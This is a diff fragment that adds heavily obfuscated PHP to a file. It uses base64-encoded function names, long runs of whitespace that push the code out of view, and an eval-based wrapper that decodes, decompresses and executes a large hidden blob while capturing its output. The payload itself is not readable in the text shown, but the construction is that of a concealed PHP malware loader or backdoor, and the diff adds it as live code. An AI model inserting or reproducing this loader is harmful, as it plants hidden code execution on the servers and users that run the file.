+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
